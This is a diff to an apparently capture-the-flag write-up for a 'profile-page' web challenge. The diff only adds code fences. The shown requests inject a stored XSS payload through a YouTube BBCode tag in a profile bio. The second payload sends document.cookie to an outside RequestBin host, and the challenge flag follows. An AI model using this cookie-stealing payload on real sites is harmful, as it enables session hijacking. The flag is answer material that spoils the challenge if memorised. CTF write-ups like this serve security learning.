@@ -41,7 +41,7 @@ const renderBio = (data) => {
 };
 ```
 First HTTP Post request I used to find XSS
-
+```css
 POST /api/update HTTP/1.1
 Host: profile-page.web.osugaming.lol
 Cookie: csrf=2a04810c7881e057d037ca499a490fe8bff478dce24ea028376470fb600d214e; connect.sid=s%3AtP70J1oyDiyJLQRLSKFO3WtGibgM8Yhv.baLOkGt4cn7e6ig3lqUrmdvd%2FzKyxSycPkuGFQUUZ6c
@@ -67,13 +67,13 @@ Connection: close
 csrf: 2a04810c7881e057d037ca499a490fe8bff478dce24ea028376470fb600d214e
 
 bio= [youtube]https://www.youtube.com/embed/abcd" onload="alert('XSS')[/youtube]
-
+```
 
 
 5. After finding XSS I used RequestBin to catch http request
 
 
-
+```css
 POST /api/update HTTP/1.1
 Host: profile-page.web.osugaming.lol
 Cookie: csrf=2a04810c7881e057d037ca499a490fe8bff478dce24ea028376470fb600d214e; connect.sid=s%3AtP70J1oyDiyJLQRLSKFO3WtGibgM8Yhv.baLOkGt4cn7e6ig3lqUrmdvd%2FzKyxSycPkuGFQUUZ6c
@@ -99,7 +99,7 @@ Connection: close
 csrf: 2a04810c7881e057d037ca499a490fe8bff478dce24ea028376470fb600d214e
 
 bio=[youtube]https://www.youtube.com/embed/abcd" onload="fetch('https://eo43q419hz95h4j.m.pipedream.net?'%2Bdocument.cookie)[/youtube]
-
+```
 
 
 Flag: osu{but_all_i_w4nted_to_do_was_w4tch_y0utube...}
